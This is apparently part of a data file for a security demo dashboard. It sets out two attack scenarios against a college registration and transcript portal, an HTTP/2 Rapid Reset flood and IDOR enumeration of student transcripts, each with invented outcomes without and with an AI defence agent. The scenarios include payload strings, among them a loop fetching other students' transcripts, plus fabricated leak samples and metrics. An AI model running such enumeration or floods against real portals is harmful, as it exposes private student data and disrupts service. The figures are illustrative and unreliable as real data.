    payload: "HTTP/2 Rapid Reset + 18,500 concurrent POST /api/courses/register flood",
    description: "Coordinated Layer-7 flood hits the course registration portal at 09:00 AM during open elective registration, attempting to exhaust worker threads and knock the portal offline.",
    withoutAgent: {
      outcomeHeadline: "Course Registration Portal Crashed (503)",
      portalStatus: "503 Service Unavailable · Portal Down",
      recordsExposed: 0,
      downtimeLabel: "Offline 1h 14m during peak slot",
      integrityScore: 18,
      impactSummary: "Database connection pool saturated within 4 seconds. Over 1,400 genuine BMSIT students received 503 timeout errors and missed their open elective registration window.",
      leakedPreview: [
        "ERR 503: Upstream pool exhausted (max_connections=200 reached)",
        "TIMEOUT: 1,492 legitimate student registration requests dropped",
        "AVAILABILITY: 0.0% uptime during peak CBCS enrollment window",
      ],
    },
    withAgent: {
      outcomeHeadline: "Volumetric Surge Shed · 99.98% Uptime Kept",
      portalStatus: "Protected · Edge Load Shedding Active",
      recordsExposed: 0,
      responseMs: 39,
      integrityScore: 100,
      mitigationAction: "AI traffic baseline spotted 62x surge from non-campus ASNs, quarantined malicious /24 CIDR at edge, and prioritized verified student session tokens.",
      agentSteps: [
        { phase: "01. Surge Telemetry", detail: "Traffic spiked from 240 req/s baseline to 18,500 req/s on /api/courses/register with empty session cookies.", ms: "8 ms" },
        { phase: "02. Bot Cluster Isolation", detail: "Clustered 97.4% of surge traffic to 3 non-residential proxy ASNs (99.8% bot probability).", ms: "19 ms" },
        { phase: "03. Priority Queueing", detail: "Dropped malicious /24 flood at edge reverse proxy while fast-tracking authenticated BMSIT USN tokens.", ms: "31 ms" },
        { phase: "04. Continuity Check", detail: "Course registration remained responsive at 42ms p95 latency for all legitimate students.", ms: "39 ms" },
      ],
    },
  },
  {
    id: "idor",
    name: "IDOR Bulk Transcript & Profile Scraping",
    shortLabel: "IDOR Scraping",
    category: "Broken Access Control · OWASP A01",
    severity: "High",
    targetPortal: "Student Profiles & Exam Transcripts",
    endpoint: "GET /api/students/1BY22CS001..1BY22CS180 (Sequential Enumeration)",
    attackerIp: "172.68.142.88",
    payload: "for i in range(1,180): fetch(`/api/students/1BY22CS${pad(i)}/transcript`)",
    description: "Logged-in rogue session iterates sequentially across other students' USN IDs to harvest private grades, fee statuses, and contact numbers without ownership checks.",
    withoutAgent: {
      outcomeHeadline: "180 Private Transcripts Harvested",
      portalStatus: "Authorization Bypass · Silent Leak",
      recordsExposed: 180,
      downtimeLabel: "Undetected without AI watcher",
      integrityScore: 32,
      impactSummary: "Endpoint validated authentication but failed per-USN ownership verification. Sequential scraping silently exported 180 private student mark cards and mobile numbers.",
      leakedPreview: [
        "SCRAPED: 1BY22CS001 -> Transcript PDF + Phone + Fee Receipt",
        "SCRAPED: 1BY22CS002 -> Transcript PDF + Phone + Fee Receipt",
        "SCRAPED: 1BY22CS041 -> Aarav Kulkarni CIE & SGPA ledger",
        "... 177 more student profiles silently downloaded",
      ],
    },
    withAgent: {
      outcomeHeadline: "Cross-USN Enumeration Halted at Request #2",
      portalStatus: "Protected · Object-Level ACL Enforced",
      recordsExposed: 0,
      responseMs: 26,
      integrityScore: 100,
      mitigationAction: "Behavioral agent detected cross-USN horizontal traversal, revoked rogue JWT session immediately, and locked endpoint to strict `token.usn === param.usn`.",
      agentSteps: [
        { phase: "01. Behavioral Graph", detail: "Session bound to guest token attempted rapid sequential fetches across foreign USNs (1BY22CS001 → 002).", ms: "6 ms" },
        { phase: "02. Access Violation Analysis", detail: "Classified as OWASP A01 Horizontal IDOR Enumeration (99.1% confidence).", ms: "14 ms" },
        { phase: "03. Session Revocation", detail: "Invalidated offending JWT immediately and enforced strict object-level ownership policy on /api/students/:usn.", ms: "21 ms" },
        { phase: "04. Audit Log Sealed", detail: "Zero foreign transcripts returned. Security alert routed to BMSIT IT Admin queue.", ms: "26 ms" },
      ],
    },
  },
];
